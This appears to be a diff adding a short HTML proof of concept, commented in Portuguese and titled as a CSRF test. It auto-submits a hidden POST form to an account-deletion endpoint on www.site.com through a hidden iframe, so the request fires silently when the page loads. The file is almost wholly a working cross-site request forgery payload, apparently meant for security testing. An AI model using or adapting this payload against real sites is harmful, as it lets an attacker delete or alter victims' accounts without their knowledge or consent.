@@ -1,0 +1,15 @@
+<!doctype html>
+<meta charset="utf-8" />
+<h1>CSRF test – clássico via form</h1>
+
+<form action="https://www.site.com/conta/deletar" method="POST" target="sink">
+  <!-- Se o backend mapear este formato, ajuste o nome conforme o parser espera -->
+  <input type="hidden" name="acao" value="site/meus-dados">
+</form>
+
+<iframe name="sink" style="display:none"></iframe>
+
+<script>
+  document.forms[0].submit(); // auto-submit
+</script>
+<p>Se o endpoint aceitar x-www-form-urlencoded, a alteração será aplicada.</p>
